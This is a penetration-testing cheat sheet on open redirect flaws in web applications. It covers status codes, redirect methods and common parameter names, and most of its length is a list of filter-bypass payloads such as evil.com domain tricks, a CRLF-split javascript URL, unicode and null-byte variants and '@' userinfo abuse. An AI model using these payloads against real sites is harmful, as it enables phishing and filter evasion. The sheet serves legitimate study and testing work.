# open url redirect

> un-validated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a url contained within untrusted input. by modifying untrusted url input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. un-validated redirect and forward attacks can also be used to maliciously craft a url that would pass the application’s access control check and then forward the attacker to privileged functions that they would normally not be able to access.


## summary

* [methodology](#methodology)
    * [http redirection status code](#http-redirection-status-code)
    * [redirect methods](#redirect-methods)
        * [path-based redirects](#path-based-redirects)
        * [javascript-based redirects](#javascript-based-redirects)
        * [common query parameters](#common-query-parameters)
    * [filter bypass](#filter-bypass)
* [labs](#labs)
* [references](#references)


## methodology

an open redirect vulnerability occurs when a web application or server uses unvalidated, user-supplied input to redirect users to other sites. this can allow an attacker to craft a link to the vulnerable site which redirects to a malicious site of their choosing.

attackers can leverage this vulnerability in phishing campaigns, session theft, or forcing a user to perform an action without their consent.

**example**: a web application has a feature that allows users to click on a link and be automatically redirected to a saved preferred homepage. this might be implemented like so:

```ps1
https://example.com/redirect?url=https://userpreferredsite.com
```

an attacker could exploit an open redirect here by replacing the `userpreferredsite.com` with a link to a malicious website. they could then distribute this link in a phishing email or on another website. when users click the link, they're taken to the malicious website.


## http redirection status code

http redirection status codes, those starting with 3, indicate that the client must take additional action to complete the request. here are some of the most common ones:

- [300 multiple choices](https://httpstatuses.com/300) - this indicates that the request has more than one possible response. the client should choose one of them.
- [301 moved permanently](https://httpstatuses.com/301) - this means that the resource requested has been permanently moved to the url given by the location headers. all future requests should use the new uri.
- [302 found](https://httpstatuses.com/302) - this response code means that the resource requested has been temporarily moved to the url given by the location headers. unlike 301, it does not mean that the resource has been permanently moved, just that it is temporarily located somewhere else.
- [303 see other](https://httpstatuses.com/303) - the server sends this response to direct the client to get the requested resource at another uri with a get request.
- [304 not modified](https://httpstatuses.com/304) - this is used for caching purposes. it tells the client that the response has not been modified, so the client can continue to use the same cached version of the response.
- [305 use proxy](https://httpstatuses.com/305) -  the requested resource must be accessed through a proxy provided in the location header. 
- [307 temporary redirect](https://httpstatuses.com/307) - this means that the resource requested has been temporarily moved to the url given by the location headers, and future requests should still use the original uri.
- [308 permanent redirect](https://httpstatuses.com/308) - this means the resource has been permanently moved to the url given by the location headers, and future requests should use the new uri. it is similar to 301 but does not allow the http method to change.


## redirect methods

### path-based redirects

instead of query parameters, redirection logic may rely on the path:

* using slashes in urls: `https://example.com/redirect/http://malicious.com`
* injecting relative paths: `https://example.com/redirect/../http://malicious.com`


### javascript-based redirects

if the application uses javascript for redirects, attackers may manipulate script variables:

**example**:

```js
var redirectto = "http://trusted.com";
window.location = redirectto;
```

**payload**: `?redirectto=http://malicious.com`


### common parameters

```powershell
?checkout_url={payload}
?continue={payload}
?dest={payload}
?destination={payload}
?go={payload}
?image_url={payload}
?next={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
?return_path={payload}
?return_to={payload}
?return={payload}
?returnto={payload}
?rurl={payload}
?target={payload}
?url={payload}
?view={payload}
/{payload}
/redirect/{payload}
```


## filter bypass

* using a whitelisted domain or keyword
    ```powershell
    www.whitelisted.com.evil.com redirect to evil.com
    ```

* using **crlf** to bypass "javascript" blacklisted keyword
    ```powershell
    java%0d%0ascript%0d%0a:alert(0)
    ```

* using "`//`" and "`////`" to bypass "http" blacklisted keyword
    ```powershell
    //google.com
    ////google.com
    ```

* using "https:" to bypass "`//`" blacklisted keyword
    ```powershell
    https:google.com
    ```

* using "`\/\/`" to bypass "`//`" blacklisted keyword
    ```powershell
    \/\/google.com/
    /\/google.com/
    ```

* using "`%e3%80%82`" to bypass "." blacklisted character
    ```powershell
    /?redir=google。com
    //google%e3%80%82com
    ```

* using null byte "`%00`" to bypass blacklist filter
    ```powershell
    //google%00.com
    ```

* using http parameter pollution
    ```powershell
    ?next=whitelisted.com&next=google.com
    ```

* using "@" character. [common internet scheme syntax](https://datatracker.ietf.org/doc/html/rfc1738)
    ```powershell
    //<user>:<password>@<host>:<port>/<url-path>
    http://www.theirsite.com@yoursite.com/
    ```

* creating folder as their domain
    ```powershell
    http://www.yoursite.com/http://www.theirsite.com/
    http://www.yoursite.com/folder/www.folder.com
    ```

* using "`?`" character, browser will translate it to "`/?`"
    ```powershell
    http://www.yoursite.com?http://www.theirsite.com/
    http://www.yoursite.com?folder/www.folder.com
    ```

* host/split unicode normalization
    ```powershell
    https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
    http://a.com／x.b.com
    ```


## labs

* [root me - http - open redirect](https://www.root-me.org/fr/challenges/web-serveur/http-open-redirect)
* [portswigger - dom-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)


## references

- [host/split exploitable antipatterns in unicode normalization - jonathan birch - august 3, 2019](https://i.blackhat.com/usa-19/thursday/us-19-birch-hostsplit-exploitable-antipatterns-in-unicode-normalization.pdf)
- [open redirect cheat sheet - pentesterland - november 2, 2018](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
- [open redirect vulnerability - s0cket7 - august 15, 2018](https://s0cket7.com/open-redirect-vulnerability/)
- [open-redirect-payloads - predrag cujanović - april 24, 2017](https://github.com/cujanovic/open-redirect-payloads)
- [unvalidated redirects and forwards cheat sheet - owasp - february 28, 2024](https://www.owasp.org/index.php/unvalidated_redirects_and_forwards_cheat_sheet)
- [you do not need to run 80 reconnaissance tools to get access to user accounts - stefano vettorazzi (@stefanocoding) - may 16, 2019](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)